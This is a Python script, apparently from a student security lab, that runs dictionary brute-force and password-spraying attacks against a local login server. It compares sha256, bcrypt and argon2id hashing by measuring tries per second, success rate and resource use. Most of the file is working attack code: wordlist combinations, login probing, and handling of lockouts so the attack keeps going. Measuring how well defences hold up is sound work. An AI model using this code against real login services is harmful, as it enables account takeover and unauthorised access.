import requests
import json
import time
from analytics import measure_resources

LOGIN_URL = "http://127.0.0.1:5000/login"
PASSWORDS_FILE = "passwords.txt"
USERS_JSON = "users.json"
GROUP_SEED = "506512019"
MAX_ATTEMPTS_PER_USER = 50000
MAX_ATTEMPTS_PER_SESSION = 1000000
session = requests.Session()
LOGIN_OK = "ok"
LOGIN_FAIL = "fail"
LOGIN_LOCKED = "locked"
LOGIN_ERROR = "error"

def load_words(path, limit=10000):
    with open(path, "r", encoding="utf-8", errors="ignore") as f:
        return [w.strip() for w in f if w.strip()][:limit]

def password_generator(words):
    count = 0

    for w in words:
        yield w
        count += 1
        if count >= MAX_ATTEMPTS_PER_USER:
            return

    for w1 in words:
        for w2 in words:
            yield w1 + w2
            count += 1
            if count >= MAX_ATTEMPTS_PER_USER:
                return
    for w1 in words:
        for w2 in words:
            for w3 in words:
                yield w1 + w2 + w3
                count += 1
                if count >= MAX_ATTEMPTS_PER_USER:
                    return

def reset_lockout():
    session.post("http://127.0.0.1:5000/reset_lockout", data={"token": GROUP_SEED})

def try_login(username, password, hash_mode):
    try:
        response = session.post(
            LOGIN_URL,
            data={
                "username": username,
                "password": password,
                "hash_mode": hash_mode
            },
        )

        text = response.text.lower()

        if "account locked" in text:
            return LOGIN_LOCKED

        if "welcome" in text or "test" in response.url:
            return LOGIN_OK

        if "invalid credentials" in text:
            return LOGIN_FAIL

        return LOGIN_ERROR

    except requests.RequestException as e:
        print("ERROR occurred in the server:", e)
        return LOGIN_ERROR


def bruteforce(username, hash_mode):
    words = load_words(PASSWORDS_FILE)
    tries = 0

    for password in password_generator(words):
        result = try_login(username, password, hash_mode)

        if result == LOGIN_OK:
            return tries, LOGIN_OK

        if result == LOGIN_LOCKED:
            # stop attacking this user; caller will move to next user
            return tries, LOGIN_LOCKED

        tries += 1

    return -1, LOGIN_FAIL


def get_user_list():
    user_list = []
    with open(USERS_JSON, "r") as f:
        data = json.load(f)
    for user in data['users']:
        user_list.append(user['username'])
    user_list = user_list[:5]
    return user_list

@measure_resources(interval=0.01)
def password_spraying(hash_mode):
    successful_cracks = {}
    locked_users = set()
    tries = 0

    users = get_user_list()
    start = time.time()
    words = load_words(PASSWORDS_FILE)

    for password in password_generator(words):
        pass_start = time.time()

        for user in users:
            if user in successful_cracks or user in locked_users:
                continue  # skip finished/locked users

            tries += 1
            result = try_login(user, password, hash_mode)

            if result == LOGIN_OK:
                successful_cracks[user] = time.time() - pass_start
                continue

            if result == LOGIN_LOCKED:
                locked_users.add(user)
                continue  # IMPORTANT: skip to next user, not break

        if tries >= MAX_ATTEMPTS_PER_SESSION or (time.time() - start) // 60 >= 2:
            break

        # optional: stop early if all users are either cracked or locked
        if len(successful_cracks) + len(locked_users) == len(users):
            break

    end = time.time() - start
    user_entries = []
    for user in get_user_list():
        if user in successful_cracks.keys():
            user_entry = {"Username": user, "Time_elapsed": successful_cracks[user], "Status": True}
            user_entries.append(user_entry)

    return tries, end, len(successful_cracks), user_entries

@measure_resources(interval=0.01)
def preform_bruteforce(hash_mode):
    total_tries = 0
    count_success = 0
    start = time.time()
    user_entries = []
    for user in get_user_list():
        print(user)
        user_start = time.time()
        tries, status = bruteforce(user, hash_mode)
        status_str = "Success" if status == LOGIN_OK else ("Locked" if status == LOGIN_LOCKED else "Fail")
        user_end = time.time() - user_start
        user_entry = {"Username": user, "Time_elapsed": user_end, "Status": status_str}
        user_entries.append(user_entry)
        if tries > 0:
            total_tries += tries
            count_success += 1
        else:
            total_tries += MAX_ATTEMPTS_PER_USER
        # check if time limit or tries limit were exceeded
        if total_tries >= MAX_ATTEMPTS_PER_SESSION or (time.time() - start)//60 >= 2:
            break
    end = time.time() - start
    # also return analytics
    return total_tries, end, count_success, user_entries

def main():
    hash_modes = ["sha256", "bcrypt", "argon2id"]
    with open("BF_NO_DEF.json","w") as file:
        for curr_hash in hash_modes:
            # preform bruteforce on the current hash encryption method
            result, avg_cpu, avg_mem = preform_bruteforce(curr_hash)
            # also add analytics
            total_tries, end, count_success, user_entries = result
            brute_json = {"hash_mode": curr_hash,
                          "Total_tries": total_tries,
                          "Time_elapsed": round(end,3),
                          "Tries_per_sec": int(total_tries / end),
                          "Success_rate": round((count_success / len(get_user_list()) * 100),2),
                          "average_cpu_use": round(avg_cpu,2),
                          "average_mem_use":  round(avg_mem,2),
                          "User_entries": user_entries}
            file.write(json.dumps(brute_json))

            # preform password spraying on the current hash encryption method
            reset_lockout()
            result, avg_cpu, avg_mem = password_spraying(curr_hash)
            total_tries, end, count_success, user_entries = result
            spray_json = {"hash_mode": curr_hash,
                          "Total_tries": total_tries,
                          "Time_elapsed": round(end, 3),
                          "Tries_per_sec": int(total_tries / end),
                          "Success_rate": round((count_success / len(get_user_list()) * 100), 2),
                          "average_cpu_use": round(avg_cpu, 2),
                          "average_mem_use": round(avg_mem, 2),
                          "User_entries": user_entries}
            file.write(json.dumps(spray_json))

if __name__ == "__main__":
    main()
